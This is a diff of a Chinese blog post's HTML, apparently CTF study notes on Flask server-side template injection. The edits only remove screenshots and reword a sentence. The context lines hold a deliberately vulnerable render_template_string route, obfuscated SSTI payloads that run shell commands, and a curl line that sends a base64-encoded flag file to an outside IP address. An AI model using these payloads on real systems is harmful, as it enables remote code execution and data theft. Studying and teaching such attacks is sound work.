@@ -45,15 +45,13 @@
 <meta property="og:image" content="https://i.loli.net/2020/02/24/e4nIbyOrsGTRVvE.png">
 <meta property="og:image" content="https://i.loli.net/2020/02/24/opIWP5TdSs7uKCE.png">
 <meta property="og:image" content="https://i.loli.net/2020/02/24/Mbd1aypGULlEmjK.png">
-<meta property="og:image" content="https://i.loli.net/2020/02/24/684jbuvrwtiSYKk.png">
-<meta property="og:image" content="c:%5CUsers%5Cgqy%5CDesktop%5CSnipaste_2020-02-24_11-21-53.png">
 <meta property="og:image" content="https://i.loli.net/2020/02/24/ynWGKe9NoX7vJrD.png">
 <meta property="og:image" content="https://i.loli.net/2020/02/24/4QkOHi6lTNpsA7X.png">
 <meta property="og:image" content="https://i.loli.net/2020/02/24/v4n2wamzGpJxyct.png">
 <meta property="og:image" content="https://i.loli.net/2020/02/24/jw7sStYhX534kTa.png">
 <meta property="og:image" content="https://i.loli.net/2020/02/24/VhvMFANZCy7m9fz.png">
 <meta property="og:image" content="https://i.loli.net/2020/02/24/WAyTklhRX4iYeOa.png">
-<meta property="og:updated_time" content="2020-02-24T10:33:39.764Z">
+<meta property="og:updated_time" content="2020-02-24T10:48:30.448Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="flask模版注入">
 <meta name="twitter:image" content="https://i.loli.net/2020/02/24/NB1qgLYkTtIsiWo.png">
@@ -147,8 +145,7 @@
 <p>漏洞原理参考： <a href="https://www.freebuf.com/column/187845.html" target="_blank" rel="noopener">https://www.freebuf.com/column/187845.html</a> </p>
 </blockquote>
 <p>漏洞原理用一句话概括：不正确的使用flask中的<code>render_template_string()</code>导致的<code>SSTI</code>，并且<strong>模板内容直接受用户控制</strong></p>
-<hr>
-<p>这篇文章主要是分析自己生成payload，因为理论上不同机器、不同python版本的payload是不尽相同的。</p>
+<p>这篇文章主要是学习并生成payload，理论上不同机器、不同python版本的payload是不尽相同的。</p>
 <p>测试代码</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&apos;/&apos;)</span><br><span class="line">def test():</span><br><span class="line">    code = request.args.get(&apos;id&apos;)</span><br><span class="line">    html = &apos;&apos;&apos;</span><br><span class="line">        &lt;h3&gt;%s&lt;/h3&gt;</span><br><span class="line">    &apos;&apos;&apos;%(code)</span><br><span class="line">    return render_template_string(html)</span><br></pre></td></tr></table></figure>
 
@@ -216,8 +213,6 @@
 <p>curl带出</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;.__class__.__mro__[-1].__subclasses__()[71].__init__.__globals__[&apos;os&apos;].system(&apos;data=$(cat /fffffflag | base64);curl http://117.78.1.204/?data=$data;&apos;)</span><br></pre></td></tr></table></figure>
 
-<img src="https://i.loli.net/2020/02/24/684jbuvrwtiSYKk.png" alt="Snipaste_2020-02-24_11-21-53.png" style="zoom:67%;">
-
 <p><code>catch_warnings</code>也可以进一步构造来执行命令 </p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">59</span><br><span class="line">&lt;class &apos;warnings.catch_warnings&apos;&gt;</span><br></pre></td></tr></table></figure>
 
@@ -227,7 +222,6 @@
 <p>可构造</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&quot;linecache&quot;].__dict__[&apos;os&apos;].__dict__[&apos;system&apos;](&apos;ls&apos;)</span><br></pre></td></tr></table></figure>
 
-<p><img src="C:%5CUsers%5Cgqy%5CDesktop%5CSnipaste_2020-02-24_11-21-53.png" alt="Snipaste_2020-02-24_11-21-53"></p>
 <p>还有几种变形</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__import__(&quot;o&quot;+&quot;s&quot;).__getattribute__(&apos;sys&apos;+&apos;tem&apos;)(&quot;l&quot;+&quot;s&quot;)</span><br><span class="line"></span><br><span class="line">__builtins__.__dict__[&apos;X19pbXBvcnRfXw==&apos;.decode(&apos;base64&apos;)](&apos;b3M=&apos;.decode(&apos;base64&apos;)).__getattribute__(&apos;sys&apos;+&apos;tem&apos;)(&apos;l&apos;+&apos;s&apos;)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&apos;linecache&apos;].__dict__[&apos;os&apos;].system(&apos;ls&apos;)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12].system(&apos;ls&apos;)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[59]()._module.linecache.os.system(&apos;ls&apos;)</span><br><span class="line"></span><br><span class="line">&#123;(lambda getthem=([x for x in ().__class__.__base__.__subclasses__() if x.__name__==&apos;catch_warnings&apos;][0]()._module.__builtins__):getthem[&apos;__import__&apos;](&apos;os&apos;).system(&apos;ls&apos;))()&#125;</span><br></pre></td></tr></table></figure>
 
